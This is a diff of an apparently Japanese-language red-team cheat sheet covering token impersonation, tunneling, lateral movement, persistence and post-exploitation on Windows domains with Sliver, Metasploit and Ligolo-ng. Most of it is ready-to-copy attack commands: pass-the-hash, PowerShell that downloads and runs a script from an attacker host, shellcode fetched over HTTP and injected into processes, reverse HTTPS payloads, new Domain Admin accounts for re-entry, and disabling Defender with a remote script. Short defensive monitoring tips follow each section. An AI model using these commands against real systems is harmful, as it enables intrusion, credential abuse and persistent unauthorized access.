+  username:<span class="v">&lt;DOMAIN&gt;</span>\\<span class="v">&lt;USER&gt;</span> hash:<span class="v">&lt;NTLM&gt;</span> binary:C:\\windows\\system32\\cmd.exe
+
+<span class="c"># PID を拾って migrate</span>
+ps -e cmd.exe
+migrate -p <span class="v">&lt;PID&gt;</span>
+
+<span class="c"># または直接 shell を返す</span>
+execute-assembly <span class="v">&lt;TOOL_DIR&gt;</span>/SharpNamedPipePTH.exe \
+  <span class="s">'username:<span class="v">&lt;DOMAIN&gt;</span>\\<span class="v">&lt;USER&gt;</span> hash:<span class="v">&lt;NTLM&gt;</span> binary:"C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" arguments:"-nop -w 1 -sta -enc <span class="v">&lt;BASE64_PAYLOAD&gt;</span>"'</span></code></pre></div>
+
+      <h3>make-token — Sliver ネイティブの token 生成</h3>
+      <p>mimikatz / SharpNamedPipePTH に比べて最も静か。ただし plaintext password が必要 (hash 単独では不可)。</p>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code><span class="c"># local user</span>
+make-token -d . -u Administrator -p <span class="s">'<span class="v">&lt;PASSWORD&gt;</span>'</span>
+
+<span class="c"># domain user</span>
+make-token -d <span class="v">&lt;DOMAIN&gt;</span> -u <span class="v">&lt;USER&gt;</span> -p <span class="s">'<span class="v">&lt;PASSWORD&gt;</span>'</span></code></pre></div>
+
+      <h3>runas — 別ユーザプロセス生成 + inject</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code><span class="c"># local admin として cmd を生成</span>
+runas -d . -u Administrator -P <span class="s">'<span class="v">&lt;PASSWORD&gt;</span>'</span> -n -p C:\\Windows\\System32\\cmd.exe
+
+<span class="c"># domain user として</span>
+runas -d <span class="v">&lt;DOMAIN&gt;</span> -u <span class="v">&lt;USER&gt;</span> -P <span class="s">'<span class="v">&lt;PASSWORD&gt;</span>'</span> -n -p C:\\Windows\\System32\\cmd.exe
+
+<span class="c"># PID 拾って migrate</span>
+ps -e cmd.exe
+migrate -p <span class="v">&lt;PID&gt;</span>
+
+<span class="c"># 直接 shell を返す (encoded PS)</span>
+runas -d <span class="v">&lt;DOMAIN&gt;</span> -u <span class="v">&lt;USER&gt;</span> -P <span class="v">&lt;PASSWORD&gt;</span> -n -p <span class="s">"C:\Windows\System32\cmd.exe"</span> \
+  -a <span class="s">"/c powershell -enc &lt;BASE64_PAYLOAD&gt;"</span></code></pre></div>
+
+      <h3>Rubeus createnetonly — alt logon context プロセス生成</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code>rubeus -t 20 -- createnetonly /program:C:\\Windows\\System32\\cmd.exe \
+  /domain:<span class="v">&lt;DOMAIN&gt;</span> /username:<span class="v">&lt;USER&gt;</span> /password:<span class="v">&lt;PASSWORD&gt;</span>
+
+<span class="c"># migrate または execute-shellcode</span>
+migrate -p <span class="v">&lt;PID&gt;</span></code></pre></div>
+
+      <h3>PSCredential (pwsh の runas 代替)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div><pre><code>$pass = ConvertTo-SecureString <span class="s">'<span class="v">&lt;PASSWORD&gt;</span>'</span> -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential(<span class="s">"<span class="v">&lt;DOMAIN&gt;</span>\<span class="v">&lt;USER&gt;</span>"</span>, $pass)
+
+Start-Process powershell.exe -Credential $Cred -ArgumentList <span class="s">"-exec bypass -C `"IEX(New-Object Net.WebClient).DownloadString('http://&lt;LHOST&gt;/payload.ps1')`""</span></code></pre></div>
+
+      <h3>Steal Token — 他ユーザプロセスに migrate</h3>
+      <p>実行中の他ユーザプロセスの PID を特定して migrate。<code>migrate</code> が失敗したら <code>execute-shellcode</code> fallback。SharpImpersonation は user 指定で最初に見つかった対象プロセスに shellcode を注入する自動化ツール。</p>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code><span class="c"># migrate (第一選択)</span>
+migrate -p <span class="v">&lt;PID&gt;</span>
+
+<span class="c"># execute-shellcode (fallback)</span>
+execute-shellcode -S -r -I 30 -p <span class="v">&lt;PID&gt;</span> <span class="v">&lt;PAYLOAD_PATH&gt;</span>/payload.x64.bin</code></pre></div>
+
+      <h3>SharpImpersonation — 自動 impersonation + injection</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code><span class="c"># impersonation 可能プロセスの列挙</span>
+execute-assembly <span class="v">&lt;TOOL_DIR&gt;</span>/SharpImpersonation.exe list
+execute-assembly <span class="v">&lt;TOOL_DIR&gt;</span>/SharpImpersonation.exe list wmi
+execute-assembly <span class="v">&lt;TOOL_DIR&gt;</span>/SharpImpersonation.exe list elevated
+
+<span class="c"># 特定ユーザ context でコマンド実行</span>
+execute-assembly <span class="v">&lt;TOOL_DIR&gt;</span>/SharpImpersonation.exe \
+  user:<span class="v">&lt;DOMAIN&gt;</span>\\<span class="v">&lt;USER&gt;</span> binary:<span class="s">"powershell ls"</span>
+
+<span class="c"># shellcode を URL 経由でロード (最も安定)</span>
+execute-assembly <span class="v">&lt;TOOL_DIR&gt;</span>/SharpImpersonation.exe \
+  user:<span class="v">&lt;DOMAIN&gt;</span>\\<span class="v">&lt;USER&gt;</span> shellcode:http://<span class="v">&lt;LHOST&gt;</span>/payload.x64.bin
+
+<span class="c"># PID 指定で shellcode inject</span>
+execute-assembly <span class="v">&lt;TOOL_DIR&gt;</span>/SharpImpersonation.exe \
+  pid:<span class="v">&lt;PID&gt;</span> shellcode:http://<span class="v">&lt;LHOST&gt;</span>/payload.x86.bin</code></pre></div>
+
+      <h3>Metasploit — incognito + token 操作</h3>
+      <p>Sliver が動作しないシナリオでの fallback。<code>incognito</code> extension を load して <code>list_tokens</code> → <code>impersonate_token</code>。</p>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">meterpreter</span><button class="copy">copy</button></div><pre><code>meterpreter &gt; load incognito
+meterpreter &gt; list_tokens -u
+meterpreter &gt; impersonate_token <span class="v">&lt;DOMAIN&gt;</span>\\<span class="v">&lt;USER&gt;</span>
+
+<span class="c"># impersonated 状態で shell 起動</span>
+meterpreter &gt; shell</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">msfconsole</span><button class="copy">copy</button></div><pre><code><span class="c"># Cross-framework fallback — Sliver から MSF handler へ drop</span>
+sudo msfvenom -p windows/x64/meterpreter/reverse_https \
+  LHOST=<span class="v">&lt;LHOST&gt;</span> LPORT=443 EXITFUNC=thread \
+  -f raw -o <span class="v">&lt;PAYLOAD_PATH&gt;</span>/msf.x64.bin
+
+sudo msfconsole -q -x <span class="s">'use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_https; set lhost &lt;LHOST&gt;; set lport 443; set exitfunc thread; set EnableStageEncoding true; set exitonsession false; run -j'</span></code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code><span class="c"># Sliver から MSF shellcode を execute</span>
+execute-shellcode -S -r -I 30 <span class="v">&lt;PAYLOAD_PATH&gt;</span>/msf.x64.bin</code></pre></div>
+
+      <div class="defense"><span class="lbl">防御 / countermeasures</span>
+        <ul>
+          <li>Event ID 4624 (logon type 9 — new credentials) を SIEM で監視 — <code>make-token</code> / <code>runas /netonly</code> が生成する logon。</li>
+          <li>SysMon EID 10 (process access) の target=lsass.exe を全件検知 — mimikatz sekurlsa::pth の副作用。</li>
+          <li>Named pipe activity 監視 — SharpNamedPipePTH は独特の pipe 名パターン。</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="s09" class="reveal">
+      <h2><span class="num">09</span>Tunneling<span class="jp">トンネリング</span></h2>
+      <p>Compromised host からアクセスできるが operator から直接届かない内部ネットワークに接続するためのフォワーディング。Sliver は <code>portfwd</code> / <code>socks5</code> / Ligolo 連携を提供。Metasploit は <code>autoroute</code> + <code>socks_proxy</code> の組合せが古典。</p>
+
+      <h3>Sliver — portfwd (target port を operator へ)</h3>
+      <p>compromised host に見える TCP port を operator の localhost へ forward。RDP や web app への直接接続に有用。</p>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code><span class="c"># TARGET:3389 → operator 127.0.0.1:33890</span>
+portfwd add -b 127.0.0.1:33890 -r <span class="v">&lt;TARGET&gt;</span>:3389
+
+<span class="c"># 一覧 / 削除</span>
+portfwd
+portfwd rm --id <span class="v">&lt;id&gt;</span></code></pre></div>
+
+      <h3>Sliver — reverse portfwd (operator → target)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code>rportfwd add -b 0.0.0.0:7999 -r 0.0.0.0:7999
+
+[*] Reverse port forwarding 0.0.0.0:7999 &lt;- 0.0.0.0:7999</code></pre></div>
+
+      <h3>Sliver — SOCKS5 proxy</h3>
+      <p>session を選択して <code>socks5 start</code>、proxychains の設定を合わせて外部ツール (netexec / impacket / nmap 等) を tunnel 通しで叩く。</p>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code>use <span class="v">&lt;session_id&gt;</span>
+socks5 start</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># /etc/proxychains4.conf</span>
+[ProxyList]
+socks5  127.0.0.1   1081
+
+<span class="c"># proxychains 経由で netexec</span>
+sudo proxychains4 -q netexec smb <span class="v">&lt;TARGET&gt;</span></code></pre></div>
+
+      <h3>Ligolo-ng — L3 トンネリング (subnet アクセス)</h3>
+      <p>Ligolo は TUN interface を作って L3 レベルで内部サブネットへ届く。SOCKS より汎用性が高く、nmap SYN scan 等の raw socket も透過。実行前に defender を無効化しないと agent が消される。</p>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># operator — proxy 起動</span>
+sudo <span class="v">&lt;TOOL_DIR&gt;</span>/ligolo-ng/proxy -selfcert -laddr <span class="v">&lt;LHOST&gt;</span>:4444</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code><span class="c"># agent を target に upload</span>
+upload <span class="v">&lt;TOOL_DIR&gt;</span>/ligolo-ng/agent.exe c:/windows/tasks/agent.exe
+ls c:/windows/tasks/agent.exe
+
+<span class="c"># agent を connect (両者どちらでも可)</span>
+shell
+C:\Windows\tasks\agent.exe -connect <span class="v">&lt;LHOST&gt;</span>:4444 -ignore-cert -retry
+
+<span class="c"># もしくは Sliver 経由で直接起動 (-o 無しならバックグラウンド)</span>
+execute C:\\Windows\\tasks\\agent.exe -connect <span class="v">&lt;LHOST&gt;</span>:4444 -ignore-cert -retry</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">ligolo</span><button class="copy">copy</button></div><pre><code><span class="c"># proxy コンソール内 — 既存 interface があれば削除</span>
+interface_delete --name tun-target
+interface_delete --name tun-vault
+
+<span class="c"># interface 作成 + ルート追加</span>
+interface_create --name tun-target
+interface_route_add --name tun-target --route <span class="v">&lt;TARGET_SUBNET/24&gt;</span>
+
+interface_create --name tun-vault
+interface_route_add --name tun-vault --route <span class="v">&lt;VAULT_IP/32&gt;</span>
+
+<span class="c"># session 選択 + tunnel 開始</span>
+session
+tunnel_start --tun tun-target
+tunnel_start --tun tun-vault</code></pre></div>
+
+      <h3>Ligolo — 多段 pivot (jump host 経由)</h3>
+      <p>compromised jump host が operator に届かず 2 段目の target に届く構成では、jump host に listener を張って operator ↔ 2 段目 target 間の中継とする。</p>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">ligolo</span><button class="copy">copy</button></div><pre><code><span class="c"># jump host:8000 → operator:80 (implant 配信用)</span>
+listener_add --addr <span class="v">&lt;JUMP&gt;</span>:8000 --to 0.0.0.0:80
+
+<span class="c"># jump host:8088 → operator:8088 (Sliver beacon 用)</span>
+listener_add --addr <span class="v">&lt;JUMP&gt;</span>:8088 --to <span class="v">&lt;LHOST&gt;</span>:8088</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code><span class="c"># jump host の IP を LHOST として beacon 生成 (2段目 target が jump 越しに callback)</span>
+generate beacon --http <span class="v">&lt;JUMP&gt;</span>:8088 \
+  --name payload.obfuscated --os windows \
+  --seconds 5 --jitter 0 --evasion</code></pre></div>
+
+      <h3>Metasploit — autoroute + socks_proxy</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">msfconsole</span><button class="copy">copy</button></div><pre><code><span class="c"># 既存 session 経由で subnet route を追加</span>
+<span class="k">msf6</span> &gt; use post/multi/manage/autoroute
+<span class="k">msf6</span> &gt; set SESSION <span class="v">&lt;id&gt;</span>
+<span class="k">msf6</span> &gt; set SUBNET <span class="v">&lt;TARGET_SUBNET/24&gt;</span>
+<span class="k">msf6</span> &gt; run
+
+<span class="c"># 外部ツール用 SOCKS proxy</span>
+<span class="k">msf6</span> &gt; use auxiliary/server/socks_proxy
+<span class="k">msf6</span> &gt; set VERSION 5
+<span class="k">msf6</span> &gt; set SRVPORT 1080
+<span class="k">msf6</span> &gt; run -j</code></pre></div>
+
+      <div class="defense"><span class="lbl">防御 / countermeasures</span>
+        <ul>
+          <li>非 admin ホストからの outbound long-lived TCP (Ligolo agent → proxy) を EDR で警戒。</li>
+          <li>クライアント PC の tun interface 作成を audit — Ligolo agent はドライバ相当の権限を取得する。</li>
+          <li>横断的な内部スキャン (proxychains 経由の nmap) は destination host の receive-only pattern (SYN/RST 大量) で NetFlow に痕跡を残す。</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="s10" class="reveal">
+      <h2><span class="num">10</span>Lateral Movement<span class="jp">横展開</span></h2>
+      <p>権限昇格と認証情報取得 (詳細は <a href="ad-compromise.html">ad-compromise</a>) の後、隣接ホストへ pivot する。Sliver は <code>jump-*</code> 系で beacon を 1 コマンドで届ける。<code>psexec</code> は古典だが安定。BOF (<code>sa-whoami</code>) は remote host 上で静かに列挙する。Metasploit は <code>exploit/windows/smb/psexec</code> とその変種。</p>
+
+      <h3>Sliver — BOF による remote 列挙</h3>
+      <p>BOF は implant プロセス内で inline 実行される — 新規プロセスなし、<code>whoami.exe</code> spawn なし。EDR にとって非常に静か。</p>
 
       <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code>sa-whoami
 
@@ -513,43 +936,44 @@ GROUP INFORMATION                                 Type                     SID
 Everyone                                          Well-known group         S-1-1-0
 ...</code></pre></div>
 
-      <h3>Sliver — psexec (classic service-based)</h3>
-      <p>Requires a <em>service-format</em> profile and a corresponding HTTP listener on the operator. Sliver drops a service binary, registers it, and starts it — the beacon calls back through the listener.</p>
+      <h3>Sliver — psexec (古典 service ベース)</h3>
+      <p>service-format profile と対応 HTTP listener が必要。Sliver は service バイナリを drop → register → start、beacon が listener に callback。</p>
 
       <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code>psexec -d <span class="v">&lt;SVC_TITLE&gt;</span> -s <span class="v">&lt;SVC_DESC&gt;</span> -p svc-lateral <span class="v">&lt;TARGET&gt;</span>
 psexec -d <span class="v">&lt;SVC_TITLE&gt;</span> -s <span class="v">&lt;SVC_DESC&gt;</span> -p svc-lateral <span class="v">&lt;DC&gt;</span>
 
-<span class="c"># Attach to the new session</span>
+<span class="c"># 新 session への attach</span>
 use <span class="v">&lt;session_id&gt;</span></code></pre></div>
 
       <h3>Sliver — jump-psexec (one-liner drop &amp; run)</h3>
-      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code>jump-psexec <span class="v">&lt;TARGET&gt;</span> <span class="v">&lt;SVC_NAME&gt;</span> <span class="v">&lt;PAYLOAD_PATH&gt;</span>/payload.x64.exe //<span class="v">&lt;TARGET&gt;</span>/c$/second.exe</code></pre></div>
+      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code>jump-psexec <span class="v">&lt;TARGET&gt;</span> <span class="v">&lt;SVC_NAME&gt;</span> \
+  <span class="v">&lt;PAYLOAD_PATH&gt;</span>/payload.x64.exe //<span class="v">&lt;TARGET&gt;</span>/c$/second.exe</code></pre></div>
 
       <h3>Sliver — jump-wmiexec</h3>
-      <p>WMI-based execution avoids service creation (no <code>services.exe</code> child, no <em>7045</em> event log). The command runs under <code>wmiprvse.exe</code>.</p>
+      <p>WMI ベースの実行はサービス作成なし (<code>services.exe</code> の child プロセスなし、event 7045 なし)。<code>wmiprvse.exe</code> 下で走る。</p>
 
       <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code>jump-wmiexec <span class="v">&lt;TARGET&gt;</span> <span class="s">'powershell -w hidden -enc &lt;BASE64_PAYLOAD&gt;'</span></code></pre></div>
 
-      <h3>Sliver — SharpRDP (RDP-based execution)</h3>
-      <p>Executes commands via RDP's virtual channel without a full desktop session. Useful when SMB/WMI are blocked but RDP is allowed. Sometimes hangs post-auth on modern RDP; test in isolation before relying on it.</p>
+      <h3>Sliver — SharpRDP (RDP virtual channel 実行)</h3>
+      <p>full desktop session を張らずに RDP virtual channel でコマンドを実行する。SMB/WMI が塞がれていて RDP のみ開いている環境で有用。現代の RDP では認証後にハングすることがあり、実運用前に isolated テストが必要。</p>
 
-      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code><span class="c"># Upload SharpRDP and invoke</span>
+      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code><span class="c"># SharpRDP を target に upload して起動</span>
 upload <span class="v">&lt;TOOL_DIR&gt;</span>/SharpRDP.exe c:/windows/temp/sharprdp.exe
 cd c:/windows/temp/
 
 c:/windows/temp/sharprdp.exe computername=<span class="v">&lt;TARGET&gt;</span> command=calc \
-  username=<span class="v">&lt;DOMAIN&gt;</span>\\<span class="v">&lt;USER&gt;</span> password=<span class="s">"&lt;PASSWORD&gt;"</span>
+  username=<span class="v">&lt;DOMAIN&gt;</span>\\<span class="v">&lt;USER&gt;</span> password=<span class="s">"<span class="v">&lt;PASSWORD&gt;</span>"</span>
 
 c:/windows/temp/sharprdp.exe computername=<span class="v">&lt;TARGET&gt;</span> \
   command=<span class="s">"powershell -w hidden -enc &lt;BASE64_PAYLOAD&gt;"</span> \
-  username=<span class="v">&lt;DOMAIN&gt;</span>\\<span class="v">&lt;USER&gt;</span> password=<span class="s">"&lt;PASSWORD&gt;"</span>
+  username=<span class="v">&lt;DOMAIN&gt;</span>\\<span class="v">&lt;USER&gt;</span> password=<span class="s">"<span class="v">&lt;PASSWORD&gt;</span>"</span>
 
-<span class="c"># Direct assembly execution via Sliver</span>
+<span class="c"># Sliver 経由の直接 assembly 実行</span>
 sharprdp -- computername=<span class="v">&lt;TARGET&gt;</span> password=<span class="v">&lt;PASSWORD&gt;</span> username=Administrator \
   command=C:\\Windows\\Temp\\second.beacon.exe</code></pre></div>
 
-      <h3>Metasploit — psexec &amp; variants</h3>
-      <div class="code"><div class="code-bar"><span class="code-lang">msfconsole</span><button class="copy">copy</button></div><pre><code><span class="c"># Classic psexec with NTLM auth</span>
+      <h3>Metasploit — psexec と変種</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">msfconsole</span><button class="copy">copy</button></div><pre><code><span class="c"># 古典 psexec + NTLM auth</span>
 <span class="k">msf6</span> &gt; use exploit/windows/smb/psexec
 <span class="k">msf6</span> &gt; set RHOSTS <span class="v">&lt;TARGET&gt;</span>
 <span class="k">msf6</span> &gt; set SMBUser <span class="v">&lt;USER&gt;</span>
@@ -561,57 +985,465 @@ sharprdp -- computername=<span class="v">&lt;TARGET&gt;</span> password=<span cl
 <span class="k">msf6</span> &gt; set LHOST <span class="v">&lt;LHOST&gt;</span>
 <span class="k">msf6</span> &gt; exploit
 
-<span class="c"># PowerShell variant — no binary on disk, avoids some AV</span>
+<span class="c"># PowerShell 変種 — disk 上に binary を落とさず、一部 AV 回避</span>
 <span class="k">msf6</span> &gt; use exploit/windows/smb/psexec_psh
 <span class="k">msf6</span> &gt; set RHOSTS <span class="v">&lt;TARGET&gt;</span>
 <span class="k">msf6</span> &gt; exploit
 
-<span class="c"># Command exec (no session, just command output)</span>
+<span class="c"># コマンド実行のみ (session を張らない)</span>
 <span class="k">msf6</span> &gt; use auxiliary/admin/smb/psexec_command</code></pre></div>
 
-      <h3>Metasploit — routing &amp; pivot</h3>
-      <div class="code"><div class="code-bar"><span class="code-lang">msfconsole</span><button class="copy">copy</button></div><pre><code><span class="c"># Autoroute through existing session (pivots subsequent modules through target)</span>
-<span class="k">msf6</span> &gt; use post/multi/manage/autoroute
-<span class="k">msf6</span> &gt; set SESSION <span class="v">&lt;id&gt;</span>
-<span class="k">msf6</span> &gt; set SUBNET <span class="v">&lt;TARGET_SUBNET/24&gt;</span>
-<span class="k">msf6</span> &gt; run
-
-<span class="c"># SOCKS proxy to route external tools</span>
-<span class="k">msf6</span> &gt; use auxiliary/server/socks_proxy
-<span class="k">msf6</span> &gt; set VERSION 5
-<span class="k">msf6</span> &gt; run -j</code></pre></div>
-
-      <div class="note"><span class="lbl">note</span>Sliver <code>jump-*</code> commands do not natively accept NTLM hashes — the current implant must already hold a session token to the target. Use <code>make-token</code> or <code>Rubeus createnetonly</code> to establish the auth context first. MSF's psexec accepts hashes directly.</div>
+      <div class="note"><span class="lbl">note</span>Sliver の <code>jump-*</code> は NTLM ハッシュを直接受け付けない — 現 implant が対象への session token を既に保持していることを前提とする。事前に <code>make-token</code> か <code>Rubeus createnetonly</code> で auth context を確立する必要あり。MSF の psexec はハッシュ直接投入で完結する。</div>
 
       <div class="defense"><span class="lbl">防御 / countermeasures</span>
         <ul>
-          <li>Sysmon Event ID 1 (process creation) with <code>ParentImage=services.exe</code> and unusual child — catches psexec service drops.</li>
-          <li>Event ID 4624 (logon) type 3 (network) from workstations to workstations without justification — anomalous laterally.</li>
-          <li>Event ID 5140 (share access) for admin$ / c$ from non-admin sources.</li>
-          <li>WMI logging (<code>Microsoft-Windows-WMI-Activity/Operational</code>) — <code>jump-wmiexec</code> and equivalents leave traces.</li>
-          <li>Restrict RDP (network-level auth, jump servers, monitor SharpRDP-signature virtual channel patterns).</li>
+          <li>Sysmon EID 1 (プロセス生成) で <code>ParentImage=services.exe</code> かつ子プロセスが非典型なもの — psexec の service drop を捕捉。</li>
+          <li>EID 4624 (logon) type 3 (network) が workstation → workstation 間で発生 — 通常業務ではまず起きない横移動。</li>
+          <li>EID 5140 (share access) — 非 admin source から admin$ / c$ へのアクセス。</li>
+          <li>WMI 活動ログ (<code>Microsoft-Windows-WMI-Activity/Operational</code>) — <code>jump-wmiexec</code> は必ず痕跡を残す。</li>
+          <li>RDP 制限 (NLA + jump server 経由 + virtual channel パターン監視で SharpRDP の signature 検出)。</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="s11" class="reveal">
+      <h2><span class="num">11</span>Persistence<span class="jp">永続化</span></h2>
+      <p>DA / EA を取得後 or 昇格した任意ホスト上で access を維持する。定石は (a) domain user を local admins に追加 (b) 新規 local user を作成して admin group + RDP group に追加。ドメインレベルの永続化 (Golden Ticket / DCSync / AdminSDHolder) は <a href="ad-compromise.html">ad-compromise</a> の s05 が本文。</p>
+
+      <h3>Local admin 追加 (domain user)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code><span class="c"># 既に compromise 済み domain user を local admins に</span>
+execute -o net localgroup administrators <span class="v">&lt;DOMAIN&gt;</span>\\<span class="v">&lt;ATTACKER_USER&gt;</span> /add
+execute -o net localgroup administrators</code></pre></div>
+
+      <h3>Local user 作成 + admin/RDP group 追加</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code>execute -o net user /add <span class="v">&lt;LOCAL_USER&gt;</span> <span class="s">"<span class="v">&lt;PASSWORD&gt;</span>"</span> /Y
+execute -o net localgroup administrators <span class="v">&lt;LOCAL_USER&gt;</span> /add
+execute -o net localgroup <span class="s">"Remote Desktop Users"</span> <span class="v">&lt;LOCAL_USER&gt;</span> /add
+execute -o net localgroup <span class="s">"Remote Management Users"</span> <span class="v">&lt;LOCAL_USER&gt;</span> /add</code></pre></div>
+
+      <h3>Domain-level 永続化 (DA on DC)</h3>
+      <p>DC 上で domain user を作成し DA + EA に追加する。取得済み権限が失われても新規アカウントで再侵入可能。DA 権限が必要。</p>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code>execute -o net user <span class="v">&lt;DOMAIN_USER&gt;</span> <span class="s">"<span class="v">&lt;PASSWORD&gt;</span>"</span> /add /Y /domain
+execute -o net group <span class="s">"Domain Admins"</span> <span class="v">&lt;DOMAIN_USER&gt;</span> /add /domain
+execute -o net group <span class="s">"Enterprise Admins"</span> <span class="v">&lt;DOMAIN_USER&gt;</span> /add /domain
+execute -o net user <span class="v">&lt;DOMAIN_USER&gt;</span> /domain</code></pre></div>
+
+      <h3>Metasploit — persistence モジュール</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">msfconsole</span><button class="copy">copy</button></div><pre><code><span class="c"># scheduled task / registry run key ベース</span>
+<span class="k">msf6</span> &gt; use exploit/windows/local/persistence
+<span class="k">msf6</span> &gt; set SESSION <span class="v">&lt;id&gt;</span>
+<span class="k">msf6</span> &gt; set STARTUP USER
+<span class="k">msf6</span> &gt; set LHOST <span class="v">&lt;LHOST&gt;</span>
+<span class="k">msf6</span> &gt; set LPORT 4444
+<span class="k">msf6</span> &gt; run
+
+<span class="c"># 別手段</span>
+<span class="k">msf6</span> &gt; use exploit/windows/local/persistence_service
+<span class="k">msf6</span> &gt; use exploit/windows/local/registry_persistence
+<span class="k">msf6</span> &gt; use post/windows/manage/sticky_keys</code></pre></div>
+
+      <div class="defense"><span class="lbl">防御 / countermeasures</span>
+        <ul>
+          <li>local Administrators group への追加を EID 4732 で監視、非管理系プロセスからの実行は警告。</li>
+          <li>domain-wide の new user + Domain Admins 追加は EID 4720/4728 で確実に記録される — SIEM 相関で即時アラート。</li>
+          <li>Scheduled task / Service 新規作成 (EID 4698 / 7045) を全 endpoint で監査、既知アプリのホワイトリスト外は要調査。</li>
+          <li>Registry run key (HKCU/HKLM Software\Microsoft\Windows\CurrentVersion\Run*) の変更を Sysmon EID 13 で監視。</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="s12" class="reveal">
+      <h2><span class="num">12</span>Post-Exploitation<span class="jp">後処理</span></h2>
+      <p>DA / SYSTEM 取得後の追加操作。RDP / WinRM 有効化、Defender / Firewall 無効化、flag 検索、再起動制御など。RDP 経由の PtH 認証を可能にする DisableRestrictedAdmin 設定は特に有用。</p>
+
+      <h3>Flag / Loot 検索</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code>cd C:/Users
+execute -o tree /f /a
+
+<span class="c"># 想定パス</span>
+cat C:/Users/Administrator/Desktop/proof.txt
+cat C:/Users/Public/local.txt</code></pre></div>
+
+      <h3>Enable RDP + PtH 対応</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code><span class="c"># RDP 有効化 + firewall 開放</span>
+reg add <span class="s">"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"</span> \
+  /v fDenyTSConnections /t REG_DWORD /d 0 /f
+netsh firewall add portopening TCP 3389 <span class="s">"Remote Desktop"</span>
+
+<span class="c"># base64 化した PS で SharpSh 経由</span>
+sharpsh -- -e -c <span class="v">&lt;BASE64_RDP_ENABLE&gt;</span>
+
+<span class="c"># PtH RDP を許可 (DisableRestrictedAdmin=0)</span>
+sharpsh -- -c <span class="s">"New-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Lsa' -Name DisableRestrictedAdmin -Value 0"</span></code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># operator 側から RDP with PtH</span>
+xfreerdp /u:Administrator /pth:<span class="v">&lt;NTLM&gt;</span> /v:<span class="v">&lt;TARGET&gt;</span> /cert:ignore /dynamic-resolution</code></pre></div>
+
+      <h3>Enable WinRM</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code><span class="c"># pwsh 直接</span>
+execute -o powershell Enable-PSRemoting -Force
+
+<span class="c"># SharpSh 経由</span>
+sharpsh -- -c <span class="s">'"Enable-PSRemoting -Force"'</span></code></pre></div>
+
+      <h3>Defender / Firewall 無効化</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code>sharpsh -t 20 -- -c <span class="s">"Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true"</span>
+
+<span class="c"># 専用スクリプトを URL から</span>
+sharpsh -t 20 -- -u <span class="s">'http://&lt;LHOST&gt;/DefendersDeath.ps1'</span> -c 1</code></pre></div>
+
+      <h3>Metasploit — post-exploit モジュール</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">msfconsole</span><button class="copy">copy</button></div><pre><code><span class="c"># RDP 有効化</span>
+<span class="k">msf6</span> &gt; use post/windows/manage/enable_rdp
+<span class="k">msf6</span> &gt; set SESSION <span class="v">&lt;id&gt;</span>
